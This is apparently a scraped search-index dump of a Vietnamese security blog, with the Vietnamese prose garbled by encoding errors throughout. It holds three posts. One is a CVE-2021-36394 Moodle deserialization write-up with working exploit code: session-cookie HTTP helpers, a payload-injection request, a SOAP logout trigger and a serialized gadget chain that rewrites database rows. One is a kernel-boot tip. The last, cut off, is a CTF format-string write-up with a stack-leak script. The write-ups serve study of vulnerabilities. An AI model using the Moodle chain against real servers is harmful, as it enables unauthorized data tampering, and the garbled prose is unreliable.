nhau. CÃ¡c phÆ°Æ¡ng thá»©c nÃ y cÃ³ thá»ƒ cÃ¹ng hoáº·c khÃ¡c lá»›p. TÃ¹y thuá»™c vÃ o mÃ£ nguá»“n mÃ  cÃ¡c chuá»—i phÆ°Æ¡ng thá»©c cÃ³ thá»ƒ gÃ¢y ra sá»± áº£nh hÆ°á»Ÿng Ä‘á»‘i vá»›i á»©ng dá»¥ng Ã­t hoáº·c nhiá»u.\nTa sáº½ chia ra lÃ m 2 pháº§n: First Link vÃ  Next Link trong Ä‘Ã³ first link lÃ  class ta truyá»n vÃ o hÃ m unserialize() vá»›i má»¥c tiÃªu sáº½ trigger cÃ¡c magic method nhÆ° __destruct() Ä‘á»ƒ gá»i chuá»—i class khÃ¡c (Next Link)\nFirst Link Khi á»©ng dá»¥ng máº¯c lá»—i PHP deserialize, káº» táº¥n cÃ´ng cÃ³ thá»ƒ thÃªm báº¥t kÃ¬ Ä‘á»‘i tÆ°á»£ng nÃ o vÃ o thá»i gian thá»±c thi thá»±c cá»§a chÆ°Æ¡ng trÃ¬nh, qua Ä‘Ã³ lÃ m thay Ä‘á»•i tÃ­nh logic vÃ  cÃ¡c luá»“ng thá»±c thi trong á»©ng dá»¥ng thÃ´ng qua cÃ¡c cÃ¡ch sau:\nChÃ¨n cÃ¡c Ä‘á»‘i tÆ°á»£ng cá»§a cÃ¡c lá»›p cÃ³ Ä‘á»‹nh nghÄ©a cÃ¡c phÆ°Æ¡ng thá»©c tá»± Ä‘á»™ng (magic method) cháº¯c cháº¯n sáº½ Ä‘Æ°á»£c gá»i sau khi chÆ°Æ¡ng trÃ¬nh káº¿t thÃºc nhÆ° __destruct() hay __wakeup() khi Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c táº¡o ra thÃ´ng qua hÃ m unserialize(). Khi Ä‘Ã³, chÆ°Æ¡ng trÃ¬nh sáº½ cÃ³ thá»ƒ gá»i hÃ ng loáº¡t cÃ¡c hÃ m khÃ¡c tÃ¹y thuá»™c vÃ o cÃ¡c lá»‡nh trong nhá»¯ng phÆ°Æ¡ng thá»©c nÃ y.\nNgoÃ i cÃ¡c magic method thÃ´ng dá»¥ng nhÆ° __destruct() __wakeup() thÃ¬ cÃ²n cÃ³ má»™t sá»‘ magic method khÃ¡c Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ°:\n1 2 3 4 __toString() __call() __set() __get( ChÃ¨n cÃ¡c Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c mÃ£ nguá»“n thá»±c thi má»™t phÆ°Æ¡ng thá»©c nÃ o Ä‘Ã³. TÆ°Æ¡ng tá»± nhÆ° trÃªn, hÃ ng loáº¡t cÃ¡c phÆ°Æ¡ng thá»©c khÃ¡c sáº½ Ä‘Æ°á»£c gá»i vÃ  cÃ³ thá»ƒ dáº«n tá»›i thay Ä‘á»•i luá»“ng hoáº¡t Ä‘á»™ng cá»§a chÆ°Æ¡ng trÃ¬nh.\nTrong mÃ£ nguá»“n logout_file_session khÃ´ng cÃ³ thao thÃ¡c ngáº§m Ã©p kiá»ƒu Ä‘á»ƒ gá»i tá»›i __toString()\nTa tÃ¬m __destruct() trong source code, táº¡i cÃ¡c folder */classes/*\nquestion: Táº¡i sao chá»‰ tÃ¬m trong cÃ¡c folder */classes/*?\nÄá»ƒ kiá»ƒm chá»©ng, ta sáº½ thá»­ truyá»n class cÃ³ method __destruct() khÃ¡c vá»›i cÃ¡c class náº±m trong cÃ¡c folder */classes/* Ä‘á»ƒ xem thá»­ cÃ³ trigger khÃ´ng! TÃ´i Ä‘Ã£ lÃ m vÃ  káº¿t quáº£ lÃ  khÃ´ng trigger ğŸ˜„\nBÃ¢y giá» cÅ©ng lÃ m tÆ°Æ¡ng tá»± bÆ°á»›c trÃªn, nhÆ°ng ta sáº½ sá»­a mÃ£ nguá»“n 1 tÃ­: táº¡i nÆ¡i trigger hÃ m unserialize() ta thÃªm dÃ²ng lá»‡nh\n1 include_once(\u0026#39;/var/www/html/moodle/backup/cc/cc_lib/xmlbase.php\u0026#39;) VÃ¢ng! nÃ³ trigger Ä‘Æ°á»£c! Sau Ä‘Ã³, tÃ´i Ä‘i tÃ¬m hiá»ƒu kÄ© thÃ¬ cÃ³ káº¿t luáº­n nhÆ° sau:\nMáº·c Ä‘á»‹nh 1 class chá»‰ cÃ³ thá»ƒ gá»i nhá»¯ng class náº±m trong cÃ¹ng thÆ° má»¥c hoáº·c cÃ¹ng namespace. Máº·c Ä‘á»‹nh cá»§a Moodle, má»i class Ä‘á»u cÃ³ thá»ƒ gá»i Ä‘Æ°á»£c cÃ¡c class náº±m á»Ÿ folder cÃ³ dáº¡ng ***/classes/*** ChÃºng ta cÃ³ thá»ƒ gá»i tá»›i 1 class báº¥t kÃ¬ khÃ´ng náº±m trong ***/classes/*** khi class Ä‘Ã³ Ä‘Æ°á»£c import vÃ o Ä‘oáº¡n code (thÃ´ng qua hÃ m require_once() hoáº·c include_once() Sau khi Ä‘á»c code 3 hÃ m nÃ y thÃ¬ link duy nháº¥t \\core\\lock\\lock() cÃ³ kháº£ nÄƒng á»©ng cá»­ vÃ¬ sá»­ dá»¥ng Ã©p kiá»ƒu string thÃ´ng qua cá»™ng chuá»—i.\nTá»›i Ä‘Ã¢y chá»‰ cáº§n $this-\u0026gt;caller trá» tá»›i Next Link, mÃ¬nh cÃ³ thá»ƒ gá»i 1 class khÃ¡c chá»©a chain __toString() Next Link search __toString() trÃªn toÃ n bá»™ source code. Vá»›i 136 káº¿t quáº£ sáº½ lÃ m Ä‘a dáº¡ng hoÃ¡ gadget chain.\nMá»¥c Ä‘Ã­ch cá»§a cÃ¡i search nÃ y theo mÃ¬nh lÃ  chá»‰ cho tháº¥y lÃ  cÃ³ nhiá»u gadget chain Ä‘á»ƒ exploit thÃ´i chá»© cÅ©ng cÃ³ gÃ¬ :)))\nTÃ¡c giáº£ dá»±a trÃªn 1 gadget chain cá»§a 1 bÃ i blog Moodle â€“ Remote Code Execution Ä‘á»ƒ modify láº¡i. Do Ä‘Ã³, Ä‘á»ƒ hiá»ƒu Ä‘Æ°á»£c payload tÃ´i cáº§n pháº£i tÃ¬m hiá»ƒu blog trÃªn. Má»™t sá»‘ nháº­n xÃ©t sau khi Ä‘á»c blog nhÆ° sau:\nChain nÃ y sá»­ dá»¥ng __toString() cá»§a attribute_format vá»›i hiá»‡n thá»±c nhÆ° sau:\n1 2 3 public function __toString() { return $this-\u0026gt;determine_format()-\u0026gt;html(); } TÃ´i tÃ¬m kiáº¿m trÃªn toÃ n bá»™ source code thÃ¬ tháº¥y hÃ m nÃ y náº±m á»Ÿ moodle/grade/report/singleview/classes/local/ui/attribute_format.php __toString() Ä‘Æ°á»£c gá»i khi chÆ°Æ¡ng trÃ¬nh thá»±c hiá»‡n 1 phÃ©p ná»‘i chuá»—i vá»›i biáº¿n cÃ³ giÃ¡ trá»‹ khÃ´ng pháº£i chuá»—i. ChÆ°Æ¡ng trÃ¬nh sáº½ gá»i __toString() Ä‘á»ƒ kiá»ƒm tra kiá»ƒu vÃ  convert sang chuá»—i\n1 2 3 4 5 6 function block_course_overview_update_myorder($sortorder) { // $sortorder is our unserialized payload. $value = implode(\u0026#39;,\u0026#39;, $sortorder); ... set_user_preference(\u0026#39;course_overview_course_sortorder\u0026#39;, $value); } Ngá»¯ cáº£nh nÃ y giá»‘ng vá»›i ngá»¯ cáº£nh cá»§a chÃºng ta khi Firstlink __destruct() táº¡i \\core\\lock\\lock() cÅ©ng thá»±c hiá»‡n ná»‘i chuá»—i vá»›i thisâ†’caller (GiÃ¡ trá»‹ this-\u0026gt;caller Ä‘Æ°á»£c kiá»ƒm soÃ¡t bá»Ÿi chÃºng ta)\nFollow cá»§a _toString() nhÆ° sau:\n1 2 3 4 5 6 7 __toString() â””â”€â”€ determine_format() â””â”€â”€ is_disabled() â”œâ”€â”€ is_overridable_item() â””â”€â”€ set_calculation() â”œâ”€â”€ get_record_data() â””â”€â”€ update() Má»¥c tiÃªu sáº½ truyá»n vÃ o giÃ¡ trá»‹ vÃ o hÃ m update() Ä‘á»ƒ thay cáº­p nháº­t giÃ¡ trá»‹ dÆ°á»›i DB.\nChain nÃ y má»¥c Ä‘Ã­ch lÃ  thay Ä‘á»•i dá»¯ liá»‡u á»Ÿ dÆ°á»›i db. Trong bÃ i nÃ y, má»¥c tiÃªu ta sáº½ sá»­a Ä‘á»•i tÃªn ná»™i dung khÃ³a há»c á»Ÿ 2 class \\grade_grade vÃ  \\grade_item Tuy nhiÃªn, __toString() cá»§a attribute_format khÃ´ng gá»i Ä‘Æ°á»£c vÃ¬ 2 class \\grade_grade vÃ  \\grade_item náº±m ngoÃ i folder */classes/*. Do Ä‘Ã³, Ä‘á»ƒ gá»i Ä‘Æ°á»£c, chÃºng ta cáº§n pháº£i gá»i class khÃ¡c chÆ°a hÃ m include class trÃªn.\n1 2 3 4 5 6 7 8 9 10 /lib/grade/grade_grade.php ^ | /lib/gradelib.php ^ | /analytics/classes/course.php ^ | \\core_analytics\\course -\u0026gt; Gá»i class \\core_analytics\\course sáº½ include file /lib/grade/grade_grade.php, sau Ä‘Ã³ cÃ³ thá»ƒ gá»i Ä‘Æ°á»£c class \\grade_grade\nTÆ°Æ¡ng tá»± vá»›i grade_item\n1 2 3 4 5 6 7 8 9 10 /lib/grade/grade_item.php ^ | /lib/gradelib.php ^ | /analytics/classes/course.php ^ | \\core_analytics\\course -\u0026gt; Gá»i class \\core_analytics\\course sáº½ include file /lib/grade/grade_item.php, sau Ä‘Ã³ cÃ³ thá»ƒ gá»i Ä‘Æ°á»£c class \\grade_item\nViáº¿t exploit yeah, má»i thá»© Ä‘Ã£ clear rá»“i. BÃ¢y giá» thÃ¬ viáº¿t exploit Inject payload\n1 2 3 4 5 6 7 8 9 10 function httpGet($url, $MoodleSession) { $curl = curl_init($url); $headers = array(\u0026#39;Cookie: MoodleSession=\u0026#39;.$MoodleSession); curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); return $response; } vá»›i lá»i gá»i hÃ m nhÆ° sau:\n1 httpGet($url.\u0026#39;/grade/report/grader/index.php?id=1\u0026amp;sifirst=Testaaaaa|\u0026#39;.$value.\u0026#34;Testbbbbbb|\u0026#34;, $MoodleSession); Trong Ä‘Ã³, $value lÃ  payload Ä‘Ã£ Ä‘Æ°á»£c serialize\nTrigger payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function httpPost($url, $data, $MoodleSession, $xml) { $curl = curl_init($url); $headers = array(\u0026#39;Cookie: MoodleSession=\u0026#39;.$MoodleSession); if($xml){ array_push($headers, \u0026#39;Content-Type: application/xml\u0026#39;); }else{ $data = urldecode(http_build_query($data)); } curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); curl_setopt($curl, CURLOPT_POSTFIELDS, $data); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy $response = curl_exec($curl); curl_close($curl); return $response; } Vá»›i lá»i gá»i hÃ m nhÆ° sau:\n1 2 3 4 5 echo \u0026#34;\\n [*] Trigger Payload \u0026#34;; $data = \u0026#39;\u0026lt;s:Envelope xmlns:s=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\u0026lt;s:Body\u0026gt; \u0026lt;LogoutNotification\u0026gt;\u0026lt;SessionID\u0026gt;ssss\u0026lt;/SessionID\u0026gt; \u0026lt;/LogoutNotification\u0026gt;\u0026lt;/s:Body\u0026gt;\u0026lt;/s:Envelope\u0026gt;\u0026#39;; httpPost($url.\u0026#39;/auth/shibboleth/logout.php\u0026#39;, $data, $MoodleSession, 1); Yeah, Inject payload vÃ  trigger payload khÃ¡ Ä‘Æ¡n giáº£n. CÃ¢u chuyá»‡n lÃ  payload chÃºng ta inject nhÆ° tháº¿ nÃ o\nXÃ¢y dá»±ng payload $value\nNhÆ° Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ trÃªn, khi hÃ m unserialize() cháº¡y payload cá»§a chÃºng ta, má»¥c tiÃªu nÃ³ sáº½ trigger FirsLink á»Ÿ \\core\\lock\\lock(), Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³, ta xÃ¢y dá»±ng nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 namespace core\\lock { class lock {} } function update_table($url, $MoodleSession, $table, $rowId, $column, $value){ $add_lib = new \\core_analytics\\course(); $lib_fb = new \\core\\lock\\lock(); $base = new gradereport_overview_external(); $fb = new gradereport_singleview\\local\\ui\\feedback(); $fb -\u0026gt; grade = new grade_grade(); $fb -\u0026gt; grade -\u0026gt; grade_item = new grade_item(); $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; calculation = \u0026#34;[[somestring\u0026#34;; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; calculation_normalized = false; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; table = $table; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; id = $rowId; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; $column = $value; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; required_fields = array($column,\u0026#39;id\u0026#39;); $lib_fb -\u0026gt; caller = $fb; // set caller to gradereport_singleview\\local\\ui\\feedback() $arr = array($add_lib, $lib_fb,$base); } $value = serialize($arr); Táº¡o ra 1 $lib_fb lÃ  class \\core\\lock\\lock() Táº¡o class $fb lÃ  gradereport_singleview\\local\\ui\\feedback() cÃ¹ng cÃ¡c giÃ¡ trá»‹ tÆ°Æ¡ng á»©ng rá»“i gÃ¡n vÃ o $lib_fb -\u0026gt; caller Ä‘á»ƒ hÃ m _destruct() thá»±c thi sáº½ Ä‘i vÃ o __toString() cá»§a feedback Trong Ä‘oáº¡n code trÃªn, $add_lib Ä‘Æ°á»£c táº¡o Ä‘á»ƒ include thÆ° viá»‡n, há»— trá»£ gá»i 2 class \\grade_grade vÃ  \\grade_item Trong exploit cÃ²n cÃ³ $base nhÆ°ng tÃ´i tháº¥y vá»›i má»¥c tiÃªu exploit thay Ä‘á»•i course name thÃ¬ khÃ´ng cáº§n thiáº¿t, lib nÃ y sáº½ phá»¥c vá»¥ má»¥c tiÃªu khÃ¡c cá»§a tÃ¡c giáº£ cho nhá»¯ng má»¥c Ä‘Ã­ch exploit khÃ¡c ","description":"CVE-2021-36394 lÃ  má»™t lá»— há»•ng trÃªn ná»n táº£ng Moodle. ÄÃ¢y lÃ  má»™t trong nhá»¯ng CVE thÃ­ch há»£p cho nhá»¯ng ngÆ°á»i má»›i báº¯t Ä‘áº§u tÃ¬m hiá»ƒu vá» PHP deserialize!","id":7,"section":"posts","tags":["cve, php"],"title":"Khi newbie há»c PHP deserialize","uri":"https://minhlongmt183.github.io/posts/cve-2021-36394-moodle-cve/"},{"content":"TIP: How to boot with an old kernel version in Ubuntu I. Má»Ÿ Ä‘áº§u CÅ©ng má»™t thá»i gian khÃ¡ lÃ¢u rá»“i tÃ´i khÃ´ng cÃ²n viáº¿t blog ná»¯a. Pháº§n lá»›n vÃ¬ tÃ´i táº­p trung há»c cÃ¡c kiáº¿n thá»©c má»›i. Tuy nhiÃªn sau má»™t thá»i gian nghiÃªn cá»©u, tÃ´i láº¡i phÃ¡t hiá»‡n ra viáº¿t blog lÃ  cÃ¡ch Ä‘á»ƒ tÃ´i lÆ°u giá»¯ vÃ  hiá»ƒu kiáº¿n thá»©c sÃ¢u hÆ¡n. Äá»“ng thá»i, Ä‘Æ°á»£c sá»± khuyáº¿n khÃ­ch tá»« mentor, tÃ´i sáº½ quay láº¡i vá»›i thÃ³i quen viáº¿t blog nÃ y, chia sáº», lÆ°u trá»¯ láº¡i cÃ¡c kiáº¿n thá»©c mÃ¬nh Ä‘Ã£ há»c!\nMá»™t trong nhá»¯ng váº¥n Ä‘á» hay gáº·p cá»§a cÃ¡c báº¡n nghiÃªn cá»©u vá» Kernel Exploitation lÃ  pháº£i boot láº¡i cÃ¡c phiÃªn báº£n kernel cÅ© hÆ¡n phiÃªn báº£n Ä‘ang cÃ³ hiá»‡n táº¡i. LÃºc má»›i báº¯t Ä‘áº§u, tÃ´i Ä‘Ã£ tá»‘n ráº¥t nhiá»u thá»i gian cho pháº§n cÃ i Ä‘áº·t nÃ y. BÃ i viáº¿t nÃ y tÃ´i sáº½ chá»‰a sáº» kinh nghiá»‡m cá»§a tÃ´i trong viá»‡c xÃ¢y dá»±ng boot láº¡i 1 phiÃªn báº£n kernel cÅ© Ä‘á»ƒ phá»¥c vá»¥ quÃ¡ trÃ¬nh nghiÃªn cá»©u.\nII. Ná»™i dung chÃ­nh Context Ngá»¯ cáº£nh: PhiÃªn báº£n hiá»‡n táº¡i:Â 5.15.0-52-generic Má»¥c tiÃªu: cÃ i kernel version 5.11 CÃ¡c bÆ°á»›c thá»±c hiá»‡n BÆ°á»›c 1: vÃ o Index of /~kernel-ppa/mainline (ubuntu.com) vÃ  chá»n phiÃªn báº£n mÃ¬nh muá»‘n cÃ i Táº£i cÃ¡c file cÃ³ Ä‘á»‹nh dáº¡ng 1 2 3 4 5 6 linux-headers-xxxxxx-generic-xxxxxx_amd64.deb linux-headers-xxxxxx_all.deb linux-image-xxxxxx-generic-xxxxxx_amd64.deb linux-modules-xxxxxx-generic-xxxxxx_amd64.deb CÃ i Ä‘áº·t táº¥t cáº£ cÃ¡c file táº£i vá» 1 sudo dpkg -i *deb Khá»Ÿi Ä‘á»™ng láº¡i mÃ¡y. Trong trÆ°á»ng há»£p chÆ°a Ä‘Æ°á»£c nhÆ° phiÃªn báº£n mong muá»‘n, chÃºng ta lÃ m tiáº¿p cÃ¡c bÆ°á»›c sau Cháº¡y cÃ¢u lá»‡nh sau Ä‘á»ƒ liá»‡t kÃª táº¥t cáº£ cÃ¡c phiÃªn báº£n kernel hiá»‡n Ä‘ang cÃ³ 1 awk \u0026#39;/menuentry/ \u0026amp;\u0026amp; /class/ {count++; print count-1\u0026#34;****\u0026#34;$0 }\u0026#39; /boot/grub/grub.cfg kiá»ƒm tra chá»‰ sá»‘ index á»Ÿ Ä‘áº§u dÃ²ng. Linux kernel 5.11 Ä‘ang á»Ÿ index 5. Sau Ä‘Ã³, chÃºng ta thay Ä‘á»•i giÃ¡ trá»‹ GRUB_DEFAULT trong file /etc/default/grub nhÆ° sau: 4 lÃ  trÆ°á»›c index 5\nupdate grub 1 sudo update-grub khá»Ÿi Ä‘á»™ng láº¡i mÃ¡y 1 reboot sau khi khá»Ÿi Ä‘á»™ng láº¡i, chÃºng ta kiá»ƒm tra, sáº½ Ä‘Æ°á»£c phiÃªn báº£n kernel nhÆ° mong muá»‘n â€¢ KhÃ¡ Ä‘Æ¡n giáº£n cho nhá»¯ng ngÆ°á»i Ä‘Ã£ biáº¿t :)) ChÃºc cÃ¡c báº¡n cÃ i Ä‘áº·t thÃ nh cÃ´ng!\n","description":"CÅ©ng má»™t thá»i gian khÃ¡ lÃ¢u rá»“i tÃ´i khÃ´ng cÃ²n viáº¿t blog ná»¯a. Pháº§n lá»›n vÃ¬ tÃ´i táº­p trung há»c cÃ¡c kiáº¿n thá»©c má»›i. Tuy nhiÃªn sau má»™t thá»i gian nghiÃªn cá»©u, tÃ´i láº¡i phÃ¡t hiá»‡n ra viáº¿t blog lÃ  cÃ¡ch Ä‘á»ƒ tÃ´i lÆ°u giá»¯ vÃ  hiá»ƒu kiáº¿n thá»©c sÃ¢u hÆ¡n. Äá»“ng thá»i, Ä‘Æ°á»£c sá»± khuyáº¿n khÃ­ch tá»« mentor, tÃ´i sáº½ quay láº¡i vá»›i thÃ³i quen viáº¿t blog nÃ y, chia sáº», lÆ°u trá»¯ láº¡i cÃ¡c kiáº¿n thá»©c mÃ¬nh Ä‘Ã£ há»c! ","id":8,"section":"posts","tags":["pwn"],"title":"TIP: How to boot with an old kernel version in Ubuntu","uri":"https://minhlongmt183.github.io/posts/pwn_tip_boost_old_kernel_version/"},{"content":"BÆ°á»›c 1 - PhÃ¢n tÃ­ch Äáº§u tiÃªn, chÃºng ta kiá»ƒm tra checksec cá»§a tá»‡p tin 1 2 3 4 5 6 7 âœ Format git:(main) âœ— checksec format [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Dá»… dÃ ng tháº¥y háº§u háº¿t cÃ¡c cÆ¡ cháº¿ báº£o máº­t Ä‘á»u Ä‘Æ°á»£c báº­t á»Ÿ trÃªn tá»‡p tin nÃ y. Tá»±a Ä‘á» lÃ  format, nÃªn ta dá»… dÃ ng biáº¿t Ä‘Æ°á»£c Ä‘Ã¢y thuá»™c loáº¡i lá»—i format-string 1 2 3 âœ Format git:(main) âœ— ./format %x.%x.%x.%x f0623a03.0.f0549142.3a1b8000 Ta má»Ÿ báº±ng ghidra: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 undefined8 main(EVP_PKEY_CTX *param_1) { long lVar1; long in_FS_OFFSET; lVar1 = *(long *)(in_FS_OFFSET + 0x28); init(param_1); echo(); if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 void echo(void) { long in_FS_OFFSET; char local_118 [264]; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); do { fgets(local_118,0x100,stdin); printf(local_118); } while( true ); } Lá»—i nÃ y cho phÃ©p chÃºng ta Ä‘á»c Ä‘Æ°á»£c dá»¯ liá»‡u trÃªn stack. Má»Ÿ trÃªn gdb, Ä‘áº·t breakpoint táº¡i printf cá»§a hÃ n echo. Cháº¡y, nháº­p input vÃ  dÃ¹ng lá»‡nh x/100gx $rsp Ä‘á»ƒ in ra dá»¯ liá»‡u trÃªn stack vÃ  quan sÃ¡t. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 pwndbg\u0026gt; x/100gx $rsp 0x7fffffffdc10:\t0x4141414141414141\t0x4141414141414141 0x7fffffffdc20:\t0x0000000a61414141\t0x0000038000000380 0x7fffffffdc30:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc40:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc50:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc60:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc70:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc80:\t0x0000000000000000\t0x00007ffff7fa85c0 0x7fffffffdc90:\t0x0000000000000000\t0x00007ffff7e516a5 0x7fffffffdca0:\t0x0000000000000000\t0x00007ffff7fa85c0 0x7fffffffdcb0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdcc0:\t0x00007ffff7fa94a0\t0x00007ffff7e4d6bd 0x7fffffffdcd0:\t0x00007ffff7fa85c0\t0x00007ffff7e43f65 0x7fffffffdce0:\t0x00005555555552d0\t0x00007fffffffdd20 0x7fffffffdcf0:\t0x00005555555550c0\t0x00007fffffffde30 0x7fffffffdd00:\t0x0000000000000000\t0x000055555555526d 0x7fffffffdd10:\t0x00007ffff7facfc8\t0xc53e05bd2bae9300 0x7fffffffdd20:\t0x00007fffffffdd40\t0x00005555555552b3 0x7fffffffdd30:\t0x00007fffffffde30\t0xc53e05bd2bae9300 0x7fffffffdd40:\t0x0000000000000000\t0x00007ffff7de30b3 0x7fffffffdd50:\t0x00007ffff7ffc620\t0x00007fffffffde38 0x7fffffffdd60:\t0x0000000100000000\t0x0000555555555284 0x7fffffffdd70:\t0x00005555555552d0\t0xbca385af5106ab45 0x7fffffffdd80:\t0x00005555555550c0\t0x00007fffffffde30 0x7fffffffdd90:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdda0:\t0x435c7a50eba6ab45\t0x435c6a1331c8ab45 0x7fffffffddb0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffddc0:\t0x0000000000000000\t0x0000000000000001 0x7fffffffddd0:\t0x00007fffffffde38\t0x00007fffffffde48 0x7fffffffdde0:\t0x00007ffff7ffe190\t0x0000000000000000 0x7fffffffddf0:\t0x0000000000000000\t0x00005555555550c0 0x7fffffffde00:\t0x00007fffffffde30\t0x0000000000000000 0x7fffffffde10:\t0x0000000000000000\t0x00005555555550ee 0x7fffffffde20:\t0x00007fffffffde28\t0x000000000000001c 0x7fffffffde30:\t0x0000000000000001\t0x00007fffffffe1be 0x7fffffffde40:\t0x0000000000000000\t0x00007fffffffe1fa 0x7fffffffde50:\t0x00007fffffffe206\t0x00007fffffffe214 0x7fffffffde60:\t0x00007fffffffe227\t0x00007fffffffe23c 0x7fffffffde70:\t0x00007fffffffe244\t0x00007fffffffe256 0x7fffffffde80:\t0x00007fffffffe292\t0x00007fffffffe29a 0x7fffffffde90:\t0x00007fffffffe2b1\t0x00007fffffffe2cd 0x7fffffffdea0:\t0x00007fffffffe2ed\t0x00007fffffffe309 0x7fffffffdeb0:\t0x00007fffffffe329\t0x00007fffffffe334 0x7fffffffdec0:\t0x00007fffffffe344\t0x00007fffffffe356 0x7fffffffded0:\t0x00007fffffffe3b2\t0x00007fffffffe3d0 0x7fffffffdee0:\t0x00007fffffffe3e4\t0x00007fffffffe41a 0x7fffffffdef0:\t0x00007fffffffe42c\t0x00007fffffffe43b 0x7fffffffdf00:\t0x00007fffffffe479\t0x00007fffffffe490 0x7fffffffdf10:\t0x00007fffffffe4c3\t0x00007fffffffe4da 0x7fffffffdf20:\t0x00007fffffffe4ea\t0x00007fffffffe4fe ChÃºng ta tháº¥y cÃ³ 1 vÃ i giÃ¡ trá»‹ cÃ³ Ä‘á»‹a chá»‰ lÃ  0x5555*** trÃªn stack. Kiá»ƒm tra cÃ¡c giÃ¡ trá»‹ nÃ y vá»›i lá»‡nh x/i dia_chi 1 2 3 4 5 6 7 8 9 10 pwndbg\u0026gt; x/i 0x00005555555552d0 0x5555555552d0 \u0026lt;__libc_csu_init\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x00005555555550c0 0x5555555550c0 \u0026lt;_start\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x000055555555526d 0x55555555526d \u0026lt;init+117\u0026gt;:\tnop pwndbg\u0026gt; x/i 0x00005555555552b3 0x5555555552b3 \u0026lt;main+47\u0026gt;:\tmov eax,0x0 pwndbg\u0026gt; x/i 0x00005555555550ee 0x5555555550ee \u0026lt;_start+46\u0026gt;:\thlt Máº·t khÃ¡c, lá»—i format-string cÃ³ thá»ƒ cho phÃ©p chÃºng ta dump dá»¯ liá»‡u trÃªn stack. ChÃºng ta sáº½ viáº¿t 1 Ä‘oáº¡n code nhá» Ä‘á»ƒ dump dá»¯ liá»‡u tá»« stack ra. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from pwn import * # HOST = \u0026#39;64.227.36.245\u0026#39; # PORT = 30730 context.clear(arch=\u0026#34;amd64\u0026#34;) # ----------------------- def com(payload, wait=True): global r r.sendline(payload) if (wait): return r.recv() def nonStopLeak(): data = [] min_val = 1 max_val = 50 log.progress(\u0026#34;Starting nonStopLeaking (range: %d to %d)...\u0026#34; % (min_val, max_val)) data.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;) for i in range(min_val, max_val): leak = \u0026#34;%{}$lx\u0026#34;.format(i) leak = com(leak).strip().decode() data.append(leak) log.success(\u0026#34;nonStopLeaking finalized...\u0026#34;) return data # -------------- exploit ----------------------- elf = ELF(\u0026#34;format\u0026#34;) r = process(\u0026#34;./format\u0026#34;) # input(\u0026#34;[+] attach gdb\u0026#34;) # Launch the fmtstr exploiter exploiter = FmtStr(com) collected_data = nonStopLeak() print(collected_data) r.interactive() Tiáº¿n hÃ nh cháº¡y, ta Ä‘Æ°á»£c káº¿t quáº£: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 âœ Format git:(main) âœ— python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./format\u0026#39;: pid 13390 [+] attach gdb [*] Found format string offset: 6 [â–†] Starting nonStopLeaking (range: 1 to 40)... exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendline(payload) [+] nonStopLeaking finalized... [\u0026#39;EMPTY ON PURPOSE\u0026#39;, \u0026#39;7f2bcf7e9a03\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf70f142\u0026#39;, \u0026#39;7fff990a1ad0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;61000a786c243625\u0026#39;, \u0026#39;6161616461616163\u0026#39;, \u0026#39;5241545361616165\u0026#39;, \u0026#39;444e457024362554\u0026#39;, \u0026#39;3800000000a\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, 